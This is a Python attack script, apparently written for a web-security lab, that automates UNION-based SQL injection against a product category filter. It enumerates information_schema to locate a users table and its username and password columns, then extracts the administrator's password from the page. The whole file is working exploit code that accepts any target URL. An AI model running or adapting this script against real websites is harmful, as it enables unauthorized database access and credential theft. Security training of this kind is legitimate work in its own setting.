import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def performrequest(url,sql_payload):
    path='/filter?category=Pets'
    r=requests.get(url+path+sql_payload, verify=False, proxies=proxies)
    return r.text

def sqli_users_table(url):
    sql_payload="' union select table_name, NULL from information_schema.tables--"
    res=performrequest(url,sql_payload)
    soup=BeautifulSoup(res, 'html.parser')
    users_table=soup.find(text=re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False
    
def sqli_users_columns(url,users_table_name):
    sql_payload="'union SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '%s'--" %users_table_name
    res=performrequest(url,sql_payload)
    soup=BeautifulSoup(res,'html.parser')
    username_column=soup.find(text=re.compile('.*username.*'))
    password_column=soup.find(text=re.compile('.*password.*'))
    return username_column, password_column

def sqli_admin_cred(url,username_column,password_column,users_table_name):
    sql_payload="' UNION select %s, %s from %s--" %(username_column, password_column, users_table_name)
    res=performrequest(url,sql_payload)
    soup=BeautifulSoup(res,'html.parser')
    adminpassword=soup.body.find(text="administrator").parent.findNext('td').contents[0]
    return adminpassword

if __name__=="__main__":
    try:
        url=sys.argv[1].strip()
    except IndexError:
        print('[-] Usage:%s <url>' %sys.argv[0])
        print('[-] Example:%s www.example.com' %sys.argv[0])
        sys.exit(-1)
    
    print('[-] looking for users table name')
    users_table_name=sqli_users_table(url)
    if sqli_users_table:
        print("Found the users table name:%s" % users_table_name)
        
        username_column,password_column=sqli_users_columns(url,users_table_name)
        if username_column and password_column:
            print('Found the username_column name:%s' %username_column)
            print('Found the password_column name:%s' %password_column)
            
            admin_password=sqli_admin_cred(url,username_column,password_column,users_table_name)
            if admin_password:
                print('[+] Found the admin credentials:%s' %admin_password)
                
            else:
                print('[-] Credentials not found')
                
        else:
            print('[-] Coulmn username and password not found')
            
    else:
        print('[-] Users table name not found')
        